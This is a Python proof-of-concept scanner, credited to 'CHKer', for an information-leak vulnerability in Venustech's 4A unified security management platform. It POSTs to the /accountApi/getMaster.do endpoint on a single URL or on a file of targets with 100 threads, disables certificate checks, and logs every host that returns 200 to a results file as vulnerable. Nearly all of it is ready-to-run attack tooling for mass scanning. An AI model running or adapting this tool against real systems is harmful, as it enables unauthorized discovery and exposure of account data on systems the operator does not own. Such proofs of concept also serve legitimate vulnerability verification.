#启明星辰-4A 统一安全管控平台 getMater 信息泄漏
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ _____ _____ _____  _      ____  _____  _____ ____ 
/  __//  __//__ __\/ \__/|/  _ \/__ __\/  __//  __\
| |  _|  \    / \  | |\/||| / \|  / \  |  \  |  \/|
| |_//|  /_   | |  | |  ||| |-||  | |  |  /_ |    /
\____\\____\  \_/  \_/  \|\_/ \|  \_/  \____\\_/\_\
                                                author :CHKer
                                                version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="启明星辰-4A 统一安全管控平台 getMater 信息泄漏")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/accountApi/getMaster.do"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.881.36 Safari/537.36'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target+payload,headers=headers,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('result61.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()